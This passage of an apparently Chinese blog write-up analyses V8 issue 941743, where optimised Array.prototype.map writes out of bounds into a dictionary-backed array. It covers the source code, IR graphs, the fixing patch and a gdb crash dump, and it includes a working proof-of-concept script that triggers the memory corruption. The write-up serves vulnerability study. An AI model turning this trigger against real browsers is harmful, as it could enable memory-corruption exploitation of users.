class="built_in">InvalidateArrayConstructor</span>(isolate);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>以上代码，仅保留了我们较为关注的地方，从中可以看出，如果数组元素类型为Smi类型，并且value &gt;&#x3D; JSArray::kInitialMaxFastElementArray成立，也就是数组长度大于JSArray::kInitialMaxFastElementArray值的时候，can_inline_array_constructor被标记为false，最终，因为该标记,site-&gt;SetDoNotInlineCall()函数被调用。该标记最终将会在src&#x2F;compiler&#x2F;js-create-lowering.cc文件中的ReduceJSCreateArray函数中使用</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (length_type.<span class="built_in">Maybe</span>(Type::<span class="built_in">UnsignedSmall</span>()) &amp;&amp; can_inline_call) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ReduceNewArray</span>(node, length, *initial_map, elements_kind,</span><br><span class="line">                        allocation, slack_tracking_prediction);</span><br><span class="line">&#125;</span><br><span class="line">...........省略线...............</span><br><span class="line"><span class="keyword">if</span> (values_all_smis) &#123;</span><br><span class="line">  <span class="comment">// Smis can be stored with any elements kind.</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (values_all_numbers) &#123;</span><br><span class="line">  elements_kind = <span class="built_in">GetMoreGeneralElementsKind</span>(</span><br><span class="line">      elements_kind, <span class="built_in">IsHoleyElementsKind</span>(elements_kind)</span><br><span class="line">                         ? HOLEY_DOUBLE_ELEMENTS</span><br><span class="line">                         : PACKED_DOUBLE_ELEMENTS);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (values_any_nonnumber) &#123;</span><br><span class="line">  elements_kind = <span class="built_in">GetMoreGeneralElementsKind</span>(</span><br><span class="line">      elements_kind, <span class="built_in">IsHoleyElementsKind</span>(elements_kind) ? HOLEY_ELEMENTS</span><br><span class="line">                                                        : PACKED_ELEMENTS);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!can_inline_call) &#123;</span><br><span class="line">  <span class="comment">// We have some crazy combination of types for the &#123;values&#125; where</span></span><br><span class="line">  <span class="comment">// there&#x27;s no clear decision on the elements kind statically. And</span></span><br><span class="line">  <span class="comment">// we don&#x27;t have a protection against deoptimization loops for the</span></span><br><span class="line">  <span class="comment">// checks that are introduced in the call to ReduceNewArray, so</span></span><br><span class="line">  <span class="comment">// we cannot inline this invocation of the Array constructor here.</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">NoChange</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">ReduceNewArray</span>(node, values, *initial_map, elements_kind, allocation,</span><br><span class="line">                      slack_tracking_prediction);</span><br></pre></td></tr></table></figure>
+<p>从分析中可以看出，该标记将影响Array(1)这个函数在JIT编译时是否会被内联优化。</p>
+<h3 id="IR图分析"><a href="#IR图分析" class="headerlink" title="IR图分析"></a>IR图分析</h3><p>首先，我们的测试代码如下，需要知道的一点是Array.prototype.map内部会调用JSCreateArray来创建新数组存放结果</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将can_inline_array_constructor设置为false</span></span><br><span class="line"><span class="title class_">Array</span>(<span class="number">2</span>**<span class="number">30</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">opt</span>(<span class="params"></span>) &#123;</span><br><span class="line">   <span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">   <span class="keyword">var</span> b = a.<span class="title function_">map</span>(<span class="function">(<span class="params">value,index</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> value;</span><br><span class="line">   &#125;);</span><br><span class="line">   <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10000</span>;i++) &#123;</span><br><span class="line">   <span class="title function_">opt</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其IR图如下，可以看到，在typed lowering阶段，JSCreateArray并没有被优化为JIT代码，其仍然为JS层的代码调用。</p>
+<img src="/ha1vk/2021/03/19/issue-941743/1.png" class="">
+<p>接下来，我们去除测试脚本里的Array(2**30);这句，然后重新查看IR图，可以发现，其被优化成了本地代码了。</p>
+<img src="/ha1vk/2021/03/19/issue-941743/2.png" class="">
+<h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><h2 id="patch分析"><a href="#patch分析" class="headerlink" title="patch分析"></a>patch分析</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/js-call-reducer.cc b/src/compiler/js-call-reducer.cc</span><br><span class="line">index <span class="number">636</span>bdc<span class="number">1.</span>.d37f461 <span class="number">100644</span></span><br><span class="line">--- a/src/compiler/js-call-reducer.cc</span><br><span class="line">+++ b/src/compiler/js-call-reducer.cc</span><br><span class="line">@@ <span class="number">-1538</span>,<span class="number">6</span> <span class="number">+1538</span>,<span class="number">13</span> @@</span><br><span class="line">       <span class="built_in">simplified</span>()-&gt;<span class="built_in">LoadField</span>(AccessBuilder::<span class="built_in">ForJSArrayLength</span>(kind)), receiver,</span><br><span class="line">       effect, control);</span><br><span class="line"></span><br><span class="line">+  <span class="comment">// If the array length &gt;= kMaxFastArrayLength, then CreateArray</span></span><br><span class="line">+  <span class="comment">// will create a dictionary. We should deopt in this case, and make sure</span></span><br><span class="line">+  <span class="comment">// not to attempt inlining again.</span></span><br><span class="line">+  original_length = effect = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(</span><br><span class="line">+      <span class="built_in">simplified</span>()-&gt;<span class="built_in">CheckBounds</span>(p.<span class="built_in">feedback</span>()), original_length,</span><br><span class="line">+      <span class="built_in">jsgraph</span>()-&gt;<span class="built_in">Constant</span>(JSArray::kMaxFastArrayLength), effect, control);</span><br><span class="line">+</span><br><span class="line">   <span class="comment">// Even though &#123;JSCreateArray&#125; is not marked as &#123;kNoThrow&#125;, we can elide the</span></span><br><span class="line">   <span class="comment">// exceptional projections because it cannot throw with the given parameters.</span></span><br><span class="line">   Node* a = control = effect = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(</span><br></pre></td></tr></table></figure>
+<p>该patch用于修复漏洞，patch位于src&#x2F;compiler&#x2F;js-call-reducer.cc文件中的JSCallReducer::ReduceArrayMap函数，该函数是对Array.prototype.map函数进行优化的，patch中主要增加了一个对源数组的长度进行检查，检查其是否大于kMaxFastArrayLength，因为添加的是一个CheckBounds节点，所以如果大于的话将deoptimization bailout从而不使用其生成的JIT代码。<br>我们来分析一下代码</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line">  Node* original_length = effect = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(</span><br><span class="line">      <span class="built_in">simplified</span>()-&gt;<span class="built_in">LoadField</span>(AccessBuilder::<span class="built_in">ForJSArrayLength</span>(kind)), receiver,</span><br><span class="line">      effect, control);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 根据original_length，调用JSCreateArray创建一个新数组</span></span><br><span class="line">  Node* a = control = effect = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(</span><br><span class="line">      <span class="built_in">javascript</span>()-&gt;<span class="built_in">CreateArray</span>(<span class="number">1</span>, <span class="built_in">MaybeHandle</span>&lt;AllocationSite&gt;()),</span><br><span class="line">      array_constructor, array_constructor, original_length, context,</span><br><span class="line">      outer_frame_state, effect, control);</span><br><span class="line"></span><br><span class="line">  Node* checkpoint_params[] = &#123;receiver, fncallback, this_arg,</span><br><span class="line">                               a,        k,          original_length&#125;;</span><br><span class="line">  <span class="type">const</span> <span class="type">int</span> stack_parameters = <span class="built_in">arraysize</span>(checkpoint_params);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检查map的回调函数是否可用，如果可以，就进行调用</span></span><br><span class="line">  Node* check_frame_state = <span class="built_in">CreateJavaScriptBuiltinContinuationFrameState</span>(</span><br><span class="line">      <span class="built_in">jsgraph</span>(), shared, Builtins::kArrayMapLoopLazyDeoptContinuation,</span><br><span class="line">      node-&gt;<span class="built_in">InputAt</span>(<span class="number">0</span>), context, &amp;checkpoint_params[<span class="number">0</span>], stack_parameters,</span><br><span class="line">      outer_frame_state, ContinuationFrameStateMode::LAZY);</span><br><span class="line">  Node* check_fail = <span class="literal">nullptr</span>;</span><br><span class="line">  Node* check_throw = <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="built_in">WireInCallbackIsCallableCheck</span>(fncallback, context, check_frame_state, effect,</span><br><span class="line">                                &amp;control, &amp;check_fail, &amp;check_throw);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 调用回调函数生成映射值</span></span><br><span class="line">  Node* vloop = k = <span class="built_in">WireInLoopStart</span>(k, &amp;control, &amp;effect);</span><br><span class="line">  Node *loop = control, *eloop = effect;</span><br><span class="line">  checkpoint_params[<span class="number">4</span>] = k;</span><br><span class="line"></span><br><span class="line">  Node* continue_test =</span><br><span class="line">      <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">simplified</span>()-&gt;<span class="built_in">NumberLessThan</span>(), k, original_length);</span><br><span class="line">  Node* continue_branch = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">common</span>()-&gt;<span class="built_in">Branch</span>(BranchHint::kNone),</span><br><span class="line">                                           continue_test, control);</span><br><span class="line"></span><br><span class="line">  Node* if_true = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">common</span>()-&gt;<span class="built_in">IfTrue</span>(), continue_branch);</span><br><span class="line">  Node* if_false = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">common</span>()-&gt;<span class="built_in">IfFalse</span>(), continue_branch);</span><br><span class="line">  control = if_true;</span><br><span class="line"></span><br><span class="line">  Node* frame_state = <span class="built_in">CreateJavaScriptBuiltinContinuationFrameState</span>(</span><br><span class="line">      <span class="built_in">jsgraph</span>(), shared, Builtins::kArrayMapLoopEagerDeoptContinuation,</span><br><span class="line">      node-&gt;<span class="built_in">InputAt</span>(<span class="number">0</span>), context, &amp;checkpoint_params[<span class="number">0</span>], stack_parameters,</span><br><span class="line">      outer_frame_state, ContinuationFrameStateMode::EAGER);</span><br><span class="line"></span><br><span class="line">  effect =</span><br><span class="line">      <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">common</span>()-&gt;<span class="built_in">Checkpoint</span>(), frame_state, effect, control);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Make sure the map hasn&#x27;t changed during the iteration</span></span><br><span class="line">  effect =</span><br><span class="line">      <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">simplified</span>()-&gt;<span class="built_in">CheckMaps</span>(CheckMapsFlag::kNone,</span><br><span class="line">                                               receiver_maps, p.<span class="built_in">feedback</span>()),</span><br><span class="line">                       receiver, effect, control);</span><br><span class="line"></span><br><span class="line">  Node* element =</span><br><span class="line">      <span class="built_in">SafeLoadElement</span>(kind, receiver, control, &amp;effect, &amp;k, p.<span class="built_in">feedback</span>());</span><br><span class="line"></span><br><span class="line">  Node* next_k =</span><br><span class="line">      <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">simplified</span>()-&gt;<span class="built_in">NumberAdd</span>(), k, <span class="built_in">jsgraph</span>()-&gt;<span class="built_in">OneConstant</span>());</span><br><span class="line"></span><br><span class="line">  Node* hole_true = <span class="literal">nullptr</span>;</span><br><span class="line">  Node* hole_false = <span class="literal">nullptr</span>;</span><br><span class="line">  Node* effect_true = effect;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">IsHoleyElementsKind</span>(kind)) &#123;</span><br><span class="line">    <span class="comment">// 跳过无值的空洞</span></span><br><span class="line">    Node* check;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">IsDoubleElementsKind</span>(kind)) &#123;</span><br><span class="line">      check = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">simplified</span>()-&gt;<span class="built_in">NumberIsFloat64Hole</span>(), element);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      check = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">simplified</span>()-&gt;<span class="built_in">ReferenceEqual</span>(), element,</span><br><span class="line">                               <span class="built_in">jsgraph</span>()-&gt;<span class="built_in">TheHoleConstant</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    Node* branch =</span><br><span class="line">        <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">common</span>()-&gt;<span class="built_in">Branch</span>(BranchHint::kFalse), check, control);</span><br><span class="line">    hole_true = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">common</span>()-&gt;<span class="built_in">IfTrue</span>(), branch);</span><br><span class="line">    hole_false = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">common</span>()-&gt;<span class="built_in">IfFalse</span>(), branch);</span><br><span class="line">    control = hole_false;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The contract is that we don&#x27;t leak &quot;the hole&quot; into &quot;user JavaScript&quot;,</span></span><br><span class="line">    <span class="comment">// so we must rename the &#123;element&#125; here to explicitly exclude &quot;the hole&quot;</span></span><br><span class="line">    <span class="comment">// from the type of &#123;element&#125;.</span></span><br><span class="line">    element = effect = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(</span><br><span class="line">        <span class="built_in">common</span>()-&gt;<span class="built_in">TypeGuard</span>(Type::<span class="built_in">NonInternal</span>()), element, effect, control);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// This frame state is dealt with by hand in</span></span><br><span class="line">  <span class="comment">// ArrayMapLoopLazyDeoptContinuation.</span></span><br><span class="line">  frame_state = <span class="built_in">CreateJavaScriptBuiltinContinuationFrameState</span>(</span><br><span class="line">      <span class="built_in">jsgraph</span>(), shared, Builtins::kArrayMapLoopLazyDeoptContinuation,</span><br><span class="line">      node-&gt;<span class="built_in">InputAt</span>(<span class="number">0</span>), context, &amp;checkpoint_params[<span class="number">0</span>], stack_parameters,</span><br><span class="line">      outer_frame_state, ContinuationFrameStateMode::LAZY);</span><br><span class="line"></span><br><span class="line">  Node* callback_value = control = effect = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(</span><br><span class="line">      <span class="built_in">javascript</span>()-&gt;<span class="built_in">Call</span>(<span class="number">5</span>, p.<span class="built_in">frequency</span>()), fncallback, this_arg, element, k,</span><br><span class="line">      receiver, context, frame_state, effect, control);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Rewire potential exception edges.</span></span><br><span class="line">  Node* on_exception = <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="keyword">if</span> (NodeProperties::<span class="built_in">IsExceptionalCall</span>(node, &amp;on_exception)) &#123;</span><br><span class="line">    <span class="built_in">RewirePostCallbackExceptionEdges</span>(check_throw, on_exception, effect,</span><br><span class="line">                                     &amp;check_fail, &amp;control);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The array &#123;a&#125; should be HOLEY_SMI_ELEMENTS because we&#x27;d only come into this</span></span><br><span class="line">  <span class="comment">// loop if the input array length is non-zero, and &quot;new Array(&#123;x &gt; 0&#125;)&quot; always</span></span><br><span class="line">  <span class="comment">// produces a HOLEY array.</span></span><br><span class="line">  MapRef holey_double_map =</span><br><span class="line">      <span class="built_in">native_context</span>().<span class="built_in">GetInitialJSArrayMap</span>(HOLEY_DOUBLE_ELEMENTS);</span><br><span class="line">  MapRef holey_map = <span class="built_in">native_context</span>().<span class="built_in">GetInitialJSArrayMap</span>(HOLEY_ELEMENTS);</span><br><span class="line">  <span class="comment">//将值存入数组</span></span><br><span class="line">  effect = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">simplified</span>()-&gt;<span class="built_in">TransitionAndStoreElement</span>(</span><br><span class="line">                                holey_double_map.<span class="built_in">object</span>(), holey_map.<span class="built_in">object</span>()),</span><br><span class="line">                            a, k, callback_value, effect, control);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">IsHoleyElementsKind</span>(kind)) &#123;</span><br><span class="line">    Node* after_call_and_store_control = control;</span><br><span class="line">    Node* after_call_and_store_effect = effect;</span><br><span class="line">    control = hole_true;</span><br><span class="line">    effect = effect_true;</span><br><span class="line"></span><br><span class="line">    control = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">common</span>()-&gt;<span class="built_in">Merge</span>(<span class="number">2</span>), control,</span><br><span class="line">                               after_call_and_store_control);</span><br><span class="line">    effect = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">common</span>()-&gt;<span class="built_in">EffectPhi</span>(<span class="number">2</span>), effect,</span><br><span class="line">                              after_call_and_store_effect, control);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">WireInLoopEnd</span>(loop, eloop, vloop, next_k, control, effect);</span><br><span class="line"></span><br><span class="line">  control = if_false;</span><br><span class="line">  effect = eloop;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Wire up the branch for the case when IsCallable fails for the callback.</span></span><br><span class="line">  <span class="comment">// Since &#123;check_throw&#125; is an unconditional throw, it&#x27;s impossible to</span></span><br><span class="line">  <span class="comment">// return a successful completion. Therefore, we simply connect the successful</span></span><br><span class="line">  <span class="comment">// completion to the graph end.</span></span><br><span class="line">  Node* throw_node =</span><br><span class="line">      <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">common</span>()-&gt;<span class="built_in">Throw</span>(), check_throw, check_fail);</span><br><span class="line">  NodeProperties::<span class="built_in">MergeControlToEnd</span>(<span class="built_in">graph</span>(), <span class="built_in">common</span>(), throw_node);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ReplaceWithValue</span>(node, a, effect, control);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Replace</span>(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>以上代码看似没有什么问题，但忽略了JSCreateArray的一个特性，如果要申请的大小大于某个阈值（0x2000000），那么其返回的对象，其Element不再是数组类型，而是Dictionary类型，测试代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">var a = Array(0x2000001);</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">DebugPrint: 0x19c022c0dbf1: [JSArray]</span><br><span class="line"> - map: 0x3427e398a9f9 &lt;Map(DICTIONARY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1e11fad11081 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x19c022c0dc11 &lt;NumberDictionary[16]&gt; [DICTIONARY_ELEMENTS]</span><br><span class="line"> - length: 33554433</span><br><span class="line"> - properties: 0x342395d80c21 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3538bdb001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x19c022c0dc11 &lt;NumberDictionary[16]&gt; &#123;</span><br><span class="line">   - max_number_key: 0</span><br><span class="line"> &#125;</span><br><span class="line">0x3427e398a9f9: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: DICTIONARY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x3427e3982fc9 &lt;Map(HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x3538bdb00609 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors (own) #1: 0x1e11fad11e69 &lt;DescriptorArray[1]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - prototype: 0x1e11fad11081 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x1e11fad10e31 &lt;JSFunction Array (sfi = 0x3538bdb0ac69)&gt;</span><br><span class="line"> - dependent code: 0x342395d802c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure>
+<p>当JSCreateArray返回的是Dictionary类型时，V8的优化代码仍然是以数组连续的方式写值的。在就导致了数组溢出。</p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Array</span>(<span class="number">2</span>**<span class="number">30</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">opt</span>(<span class="params">a</span>) &#123;</span><br><span class="line">   <span class="keyword">return</span> a.<span class="title function_">map</span>(<span class="function">(<span class="params">value,index</span>)=&gt;</span>&#123;<span class="keyword">return</span> value&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,,,,<span class="number">4</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x20000</span>;i++) &#123;</span><br><span class="line">   <span class="title function_">opt</span>(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a.<span class="property">length</span> = <span class="number">0x2000000</span>;</span><br><span class="line">a.<span class="title function_">fill</span>(<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">a.<span class="property">length</span> += <span class="number">0x66</span>;</span><br><span class="line"><span class="comment">//溢出</span></span><br><span class="line"><span class="title function_">opt</span>(a);</span><br></pre></td></tr></table></figure>
+<p>调试过程，报了Segmentation fault.错误，这是因为越界写，超过了可访问的区域。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Thread 1 &quot;d8&quot; received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x00000d833f382f6a in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> RAX  0x2c9f5e100139 ◂— 0x210000242e4080a9</span><br><span class="line"> RBX  0x2c9f5e100159 ◂— 0x352a634016</span><br><span class="line"> RCX  0x2000066</span><br><span class="line"> RDX  0x7fc28f74a0bd ◂— &#x27;end - start &lt;= kHandleBlockSize&#x27;</span><br><span class="line"> RDI  0x7ffc6bfa0c48 —▸ 0x2c9f5e100139 ◂— 0x210000242e4080a9</span><br><span class="line"> RSI  0x34218f8017d9 ◂— 0x352a63400f</span><br><span class="line"> R8   0xffd3</span><br><span class="line"> R9   0xae2d8a02b31 ◂— 0x210000242e40802e</span><br><span class="line"> R10  0x100000000</span><br><span class="line"> R11  0x242e40802e89 ◂— 0x40000352a634001</span><br><span class="line"> R12  0x1</span><br><span class="line"> R13  0x55715eb87e50 —▸ 0x352a63400751 ◂— 0x5a0000352a634004</span><br><span class="line"> R14  0xffd3</span><br><span class="line"> R15  0x6</span><br><span class="line"> RBP  